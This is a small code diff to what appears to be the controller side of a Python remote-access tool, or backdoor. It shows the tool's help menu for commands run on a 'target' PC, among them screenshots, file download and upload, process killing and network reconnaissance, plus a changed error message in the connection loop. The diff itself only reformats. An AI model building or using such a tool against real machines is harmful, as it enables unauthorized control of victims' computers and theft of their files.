@@ -91,7 +91,6 @@ cd                    ->  Displays the name of or changes the current directory
 cls [For windows]     ->  clear the shell
 hostname              ->  Show the hostname of the target
 time                  ->  Show current time on target PC
-
 Network Commands:
 =================================================================
 ipconfig              ->  Show IP address of the target
@@ -101,7 +100,6 @@ ping <IP>             ->  Ping the IP address
 getmac                ->  Get Mac Address of the target     
 nslookup <IP>         ->  Show DNS information    
 tracert <IP>          ->  Trace data packet to the server    [+] This command take long time to show output  
-
 Utility:
 =================================================================
 whoami                ->  getUID
@@ -117,13 +115,11 @@ taskkill              ->  Kill or stop a running process or application
 type                  ->  Displays the contents of a file
 vol                   ->  Displays a disk volume label and serial number
 search                ->  Search for a file
-
 Features:
 ================================================================
 screenshot            ->  takes screenshot of target desktop
 download <filename>   ->  recieve file from target
 upload <filename>     ->  send file to target
-
 Extra Commands:
 =================================================================
 time                  ->  Show current time of target PC
@@ -175,7 +171,7 @@ quit                  ->  Quit the existing shell
                 result = output_recv(target)
                 print(result)
             except:
-                print(termcolor.colored("[-] Error occured!","red"))
+                print(termcolor.colored("[-] Fatal Error occured Connection failed!","red"))
 
 def accept_connections():
     while True:
